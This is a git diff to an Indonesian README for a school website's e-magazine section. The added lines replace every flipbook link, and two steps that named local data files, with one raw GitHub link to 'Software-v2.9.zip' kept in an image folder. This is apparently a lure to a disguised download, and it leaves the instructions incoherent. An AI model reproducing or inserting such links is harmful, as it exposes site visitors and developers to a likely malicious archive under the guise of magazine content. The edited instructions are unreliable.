@@ -9,7 +9,7 @@ SMAKONE Website
 Note: Image must in webp format
 
 1. Taruh Cover E mag ke src/image/Emagz
-2. Buka src/Component/Data/HomeMagazine.js
+2. Buka https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip
 3. Taruh code 
 ```
 import "Nama File" from "../../Image/Emagz/'Nama File'"
@@ -22,25 +22,25 @@ Dari
         id:1,
         title: "Festive February",
         img:FestiveFebruary,
-        link:"https://heyzine.com/flip-book/8f4e62c54f.html"
+        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
     },
     {
         id:2,
         title: "Floraison",
         img:Floraison,
-        link:"https://heyzine.com/flip-book/dc4f4f44ec.html"
+        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
     },
     {
         id:3,
         title: "Aphrodite April",
         img:AphroditeApril,
-        link:"https://heyzine.com/flip-book/5c1931dac5.html"
+        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
     },
     {
         id:4,
         title: "Summer Maylodies",
         img:SummerMaylodies,
-        link:"https://heyzine.com/flip-book/a5b0ed1cb6.html"
+        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
     },
 
 ``` 
@@ -51,19 +51,19 @@ Ganti ke
         id:1,
         title: "Floraison",
         img:Floraison,
-        link:"https://heyzine.com/flip-book/dc4f4f44ec.html"
+        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
     },
     {
         id:2,
         title: "Aphrodite April",
         img:AphroditeApril,
-        link:"https://heyzine.com/flip-book/5c1931dac5.html"
+        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
     },
     {
         id:3,
         title: "Summer Maylodies",
         img:SummerMaylodies,
-        link:"https://heyzine.com/flip-book/a5b0ed1cb6.html"
+        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
     },
     {
         id:4,
@@ -73,7 +73,7 @@ Ganti ke
     },
 ```
 
-5. Buka src/Component/Data/magazineList.js
+5. Buka https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip
 6. taruh code
 ```
 import "Nama File" from "../../Image/Emagz/'Nama File'"
